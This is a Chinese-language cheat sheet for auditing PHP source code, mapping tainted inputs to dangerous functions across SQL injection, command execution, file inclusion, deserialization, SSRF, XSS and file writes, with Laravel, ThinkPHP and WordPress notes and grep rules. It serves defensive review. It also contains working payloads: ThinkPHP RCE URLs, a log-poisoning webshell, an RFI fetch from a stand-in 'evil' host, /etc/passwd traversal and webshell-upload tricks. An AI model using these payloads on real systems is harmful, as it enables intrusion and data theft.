# PHP Sink 速查表

> 何时开本表：白盒审 PHP 项目已定位入口/路由，需要把污点源→危险汇的连通路径一次性圈全；只记得漏洞类不记得函数/绕过细节时按表反查；半黑盒（拿到部分源码/插件源码）验证某函数可利用性。不适合：纯黑盒无源码、已知框架 CVE 直接打（直接看「历史 CVE 模式」）。

## 污点源

| 源 | 形态 | 备注 |
|---|---|---|
| $_GET / $_POST / $_REQUEST | 超全局 | $_REQUEST 合并顺序受 variables_order 影响，同名可被 cookie 覆盖 |
| $_COOKIE | 超全局 | 反序列化 gadget 最常见入口，改包即达 |
| $_SERVER | 超全局 | `HTTP_*` 键即请求头：HTTP_USER_AGENT / HTTP_X_FORWARDED_FOR / HTTP_REFERER，常被误当"服务端数据"漏审 |
| $_FILES | 上传 | name（原始文件名）可控；tmp_name 内容即 payload；type 是客户端给的 |
| php://input | `file_get_contents('php://input')` | POST 原始 body，绕 WAF 常用；json_decode 后仍带污点 |
| $argv / $_SERVER['argv'] | CLI 参数 | 定时任务/脚本入口，普遍无鉴权无过滤 |
| getenv() / apache_request_headers() | 函数 | 等价取 $_SERVER['HTTP_*'] |

## 危险汇（按漏洞类）

### SQL 注入

| sink | 危险条件 | 常见绕过 |
|---|---|---|
| mysqli_query / $mysqli->query | 变量直拼且未 prepare | 注释符 `-- ` / `%23`；数字型零闭合 |
| PDO::query / PDO::exec | 同上 | 同上 |
| prepare+bindParam | 本体安全；ORDER BY / LIMIT / 表名 / 列名**无法绑定**，被迫拼接处即注入点 | 排序字段传 `updatexml(1,concat(0x7e,user()),1)`、`if(1,sleep(5),0)` |
| real_escape_string / addslashes | 字符集 gbk/big5 且用 SET NAMES 而非 mysqli_set_charset 设置 | 宽字节 `%df%27`：转义后 `%df%5c%27` 中 `%df%5c` 合成汉字，`%27` 裸露 |
| `LIKE '%{$k}%'` | 未处理 `%` `_` | 通配符探测/DoS |

```php
$id   = $_GET['id'];
$sort = $_GET['sort'];
$mysqli->query("SELECT * FROM users WHERE id = $id");        // 经典数字型
// prepare 绑不了 ORDER BY 列名 → 被迫拼接处：
$pdo->query("SELECT * FROM users ORDER BY {$sort} LIMIT 5"); // 报错/时间盲注
```

- 审计先看 query( 后是否直接出现 `{$` / `.{$_` / sprintf
- PDO ATTR_EMULATE_PREPARES=true（默认）转义在客户端完成，charset 陷阱与 mysqli 相同
- 宽字节判定：连接后 `SET NAMES gbk` 而不是 `mysqli_set_charset($link,'gbk')`

### 命令执行

| sink | 危险条件 | 常见绕过 |
|---|---|---|
| system / exec / passthru | 参数含污点且整串拼接 | `;` `\|\|` 反引号（sh）；参数注入（值以 `-` 开头给目标程序加选项） |
| shell_exec / 反引号 | 同上，回显进变量 | 同上 |
| popen / proc_open | 同上 | 双向管道，无回显时写文件回收 |
| pcntl_exec | CLI 下替换进程映像 | 常驻脚本/队列 worker |
| escapeshellarg"失效" | ①拼的是整条命令而非单参数；②只转义部分参数，其余直拼；③Windows 平台对 `%` `^` `"` 处理历史缺陷；④场景是 sh -c "整串" | CVE-2016-10033（PHPMailer）同款：合法值内注入换行+`-X` 落日志写 webshell |

```php
$ip = $_GET['ip'];
system("ping -c 1 " . escapeshellarg($ip));     // 单参数正确转义=安全参照物
system("convert " . $_GET['in'] . " out.png");  // 参数注入：?in=-write /tmp/s.php
system("sh -c 'mkdir " . escapeshellarg($_GET['d']) . "'"); // 转义被引号语境吞掉
```

- escapeshellarg 只保证"一个参数"，不保证"这条命令安全"：命令名/其他参数仍可被注入
- 有回显优先 system/passthru，无回显看日志/文件侧信道

### 代码执行 / 文件包含

| sink | 危险条件 | 常见绕过 |
|---|---|---|
| eval | 参数含污点（模板引擎/计算器场景高发） | 闭合原语句再拼 payload |
| assert | PHP<8 且字符串参数 → 当 PHP 执行；PHP8 起仅求值 | 传字符串即触发 |
| preg_replace + `/e` | PHP5.x 第 3 参+e 修饰符，5.5 弃用 7.0 移除 | 捕获组即注入点 |
| create_function | 内部即 eval，PHP8 移除 | 闭合 `}` 注入 |
| include / require 可控 | 路径污点 → LFI 起手 | 见下方链 |
| call_user_func(_array) | 函数名可控 | `call_user_func('system',$cmd)` 一步到位 |
| array_map / usort / array_filter | 回调参数可控 | 同上 |

include 链（LFI→RFI→日志→session）：
- LFI 读源码：`?p=php://filter/read=convert.base64-encode/resource=config.php`
- 日志包含：UA 预埋 `<?php system($_GET[1]);` 后 `?p=/var/log/nginx/access.log`（或 /proc/self/fd/N、/proc/self/environ）
- session 包含：UA/用户名写进 session 后 `?p=/tmp/sess_<PHPSESSID>`
- RFI：`allow_url_include=On` 时 `?p=http://evil/shell.txt`（含 data://）
- phar：`?p=phar://up/pic.gif/x.txt` 触发反序列化（见下节）
- pearcmd.php：register_argc_argv=On 时 `config-create` 写文件

```php
$page = $_GET['page'] ?? 'home';
include(__DIR__ . '/pages/' . $page . '.php');
// 后缀拼接可被 %00 截断(PHP<5.3.4)；路径穿越 ?page=../../../../../etc/passwd%00
```

### 反序列化

| sink | 危险条件 | 常见绕过 |
|---|---|---|
| unserialize | 输入污点（cookie/json/缓存/数据库回读字段） | 见下 |
| phar:// + file_exists / is_dir / filesize / fopen / getimagesize / filectime | 路径前缀可控即触发 metadata 反序列化，全程**不出现 unserialize 字样**；phar.readonly 只挡生成不挡触发 | 上传点给 .gif 头 + 序列化尾巴 |

```php
$cart = unserialize($_COOKIE['cart']);     // 污点直入
// POP 起点优先级：__destruct > __wakeup > __toString > __call > __get > __invoke
file_exists($_GET['f']);                   // ?f=phar://upload/pic.gif/a.txt
```

- __wakeup 绕过 CVE-2016-7124：串里属性个数 > 类真实属性数 → 跳过 __wakeup（PHP5<5.6.25，7<7.0.10）
- 属性可见性：protected → `\0*\0prop`，private → `\0ClassName\0prop`，URL 传参时 `%00`
- 黑名单绕过：`S:` 十六进制字符串、`O:`/`o:` 大小写、数字前正号 `+1`

### SSRF

| sink | 危险条件 | 常见绕过 |
|---|---|---|
| file_get_contents | URL 污点 | 支持 http/ftp/ftp/file（allow_url_fopen）/data/php://filter；不注册 gopher；IP 黑名单用十进制 IP `2130706433`、`[::]`、DNS rebinding |
| curl_exec | URL 污点 | curl 支持 gopher/dict/telnet/ldap；CURLOPT_FOLLOWLOCATION 下 302 跳 `gopher://` 绕协议校验 |
| fsockopen / stream_socket_client | host/port 污点 | 裸 socket 手打内网 redis（写 crontab/主从 RCE）、fastcgi（SSRF→FCGI 直连执行）、伪造 MySQL 服务读客户端文件 |

```php
echo file_get_contents($_GET['url']);       // 内网 GET；file:// 读本地文件
$ch = curl_init($_GET['url']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);// 跳转目标不受首轮校验 → gopher/dict
```

- 校验只做一次 host 白名单时，重点看 FOLLOWLOCATION 与重定向后的 URL
- 内网标志性端口：6379 redis / 9000 fastcgi / 11211 memcached / 3306

### XSS

| sink | 危险条件 | 常见绕过 |
|---|---|---|
| echo / print 污点 | 无转义直出 | 常规 payload |
| htmlspecialchars | **默认 flags=ENT_COMPAT 只编码双引号**；输出在单引号属性 `value='...'` 时逃逸 | `?n=x' onfocus=alert(1) autofocus '` |
| json_encode 进 `<script>` | 默认不编码 `/` | `</script><script>` 逃逸；需 JSON_HEX_TAG/JSON_HEX_AMP |
| header('Location: '.$_) | 换行未过滤（老版本） | CRLF 响应拆分 |

```php
<input value='<?= htmlspecialchars($_GET['n']) ?>'>
<!-- 修复：htmlspecialchars($n, ENT_QUOTES, 'UTF-8') -->
```

- 排查点：value/title/onclick 等单引号模板 + 默认转义函数组合
- 富文本场景看 HTMLPurifier 是否配置了宽松白名单

### 文件写入 → webshell 落地

| sink | 危险条件 | 常见绕过 |
|---|---|---|
| file_put_contents($f,$d) | $f 或两参污点 | `../` 穿越；后缀黑名单 → `.user.ini` / `.htaccess` |
| fopen+fwrite / fputs | 同上 | 同上 |
| move_uploaded_file | 目标路径拼接 $_FILES['name'] | 文件名带 `../`；空字节（老版本） |
| copy / rename / unlink | 源或目标污点 | 覆盖配置文件 |

```php
file_put_contents($_GET['path'], $_GET['data']);
// ?path=shell.php 直接落地；挡 .php 时：
// ?path=.user.ini&data=auto_prepend_file=shell.txt   (fastcgi/cgi，同目录再传 shell.txt)
// ?path=.htaccess&data=AddType application/x-httpd-php .png   (apache)
```

- 检查点：后缀校验是白名单（取扩展用 pathinfo 白名单）还是黑名单；内容是否过滤 `<?php`
- 上传目录是否可解析 PHP（配置层配合）

## 框架特有

### Laravel

| 面 | 特征 |
|---|---|
| SQLi | `whereRaw / orWhereRaw / orderByRaw / havingRaw / selectRaw / DB::raw` 参数直收 Request 输入 |
| 反序列化 POP | 入口几乎都在 `__destruct`/`__toString`（如 5.5-5.8 的 Illuminate\Broadcasting\PendingBroadcast），中转 Facade/Manager 的 `__call` 落 call_user_func_array；直接 phpggc Laravel/RCE 系列对照 framework 版本 |
| .env / APP_KEY 泄露 | 备份文件、.git、目录列表；拿到 APP_KEY → cookie/session 加密体系（encrypt+serialize）可伪造 → middleware 解密处反序列化 RCE；APP_DEBUG=true + ignition ≤8.4.1 即 CVE-2021-3129 |

```php
User::whereRaw("id = " . $request->input('id'))->get();   // raw 直拼
```

### ThinkPHP

| 版本 | 形态 |
|---|---|
| 5.0 RCE | `?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id`（根因：controller 名未过滤 `\`，反射进 App::invokeFunction） |
| 5.1 RCE | `?s=index/\think\app/invokefunction&...`（同上，多个反斜杠） |
| 5.x SQLi | `?username[0]=exp&username[1]==1 and updatexml(1,concat(0x7e,user()),1)`；bind 模式 `username[0]=bind&username[1]=0 and updatexml(...)`；order 注入 `?order[id updatexml(1,concat(0x7e,user()),1)]` |
| 6.x | 多语言包含：`?lang=../../../../usr/local/lib/php/pearcmd` + argv 写 shell（需开 lang 且 register_argc_argv） |
| invokeFunction 遗留 | 官方修复后，二开 CMS 自写 Controller 仍常见 `$this->invokeFunction($method,$vars)` 且 $method/$vars 取自 `$request->param()` |

### WordPress 插件

| 面 | 审计要点 |
|---|---|
| 入口矩阵 | `wp_ajax_{action}`（登录）/ `wp_ajax_nopriv_{action}`（未登录可调）/ `admin_post_{action}` / `register_rest_route`（查 permission_callback 是否为 `__return_true`） |
| CSRF | 写操作缺 `wp_verify_nonce` / `check_admin_referer` = CSRF；nonce 不等于权限，仍需 current_user_can |
| SQLi | `$wpdb->query("... $id")`、`$wpdb->get_results` 直拼；prepare 误用：占位符个数不匹配、把表名/列名当 %s |
| SSRF | `wp_remote_get/post` 收 webhook/导入 URL；`wp_safe_remote_get` 只校验协议与重定向域名，不拦内网 IP |

```php
$wpdb->query("SELECT * FROM {$wpdb->prefix}msg WHERE id = " . $_GET['id']);
```

## 历史 CVE 模式

| CVE | 根因 | 查找特征 |
|---|---|---|
| CVE-2015-8562（Joomla<3.4.6） | X-Forwarded-For/UA 头写入 session，反序列化时触发 gadget | 搜 unserialize 处理 session/头入库存档处 |
| CVE-2017-9841（PHPUnit 4.8.19-4.8.27/5.0.10-5.6.2） | eval-stdin.php 把 php://input 直接 eval（`eval('?>'.file_get_contents('php://input'))`） | vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 存在且可直访 |
| CVE-2018-19518（PHP imap 扩展） | imap_open mailbox 参数未过滤，注入 `-oProxyCommand=` 执行命令 | 搜 `imap_open(` 参数拼接用户输入 |
| CVE-2021-3129（Laravel Ignition） | _ignition/execute-solution 的文件读写 + php://filter 转换链清空日志 → 配合 phar 反序列化 RCE | vendor/facade/ignition 存在 + APP_DEBUG=true |
| CVE-2018-7600（Drupal<7.58/8.5.1） | 表单/邮件参数被当 renderable 数组，`#lazy_builder/#pre_render` 落 call_user_func | 用户可控数组进入 render()/drupal_render() |

## 自动化辅助

1. semgrep 官方规则先全扫：`semgrep --config p/php --config security-audit`，覆盖上表大半 sink，再自写补丁规则。
2. 自写污点规则（source=超全局/php://input/$argv → sink=本表函数），重点是 taint 模式跨文件传播，纯模式匹配会漏中间变量。
3. rg 快速圈点（排除 vendor 后人工确认）：

```bash
rg -n "unserialize\s*\(" --type php -g '!vendor'
rg -nE "(include|require)(_once)?\s*\(?\s*\$_(GET|POST|REQUEST|COOKIE)" --type php
rg -n "(whereRaw|orderByRaw|havingRaw|DB::raw|selectRaw)" app/          # Laravel
rg -nE "\$wpdb->(query|get_var|get_results|get_row)\(" wp-content/plugins/
rg -n "(__destruct|__wakeup|__toString|__call|__invoke)\s*\(" --type php -l   # gadget 候选类
```

4. gadget 挖掘：上一步候选类清单对照 phpggc 已生成链；composer.lock 老版本组件跑 `composer audit` 再回源码验证可达性。
5. WordPress 专用：`wp_ajax_nopriv_` 与 `register_rest_route` 全量列出，逐个核对 nonce + capability，缺一即报 CSRF/越权。
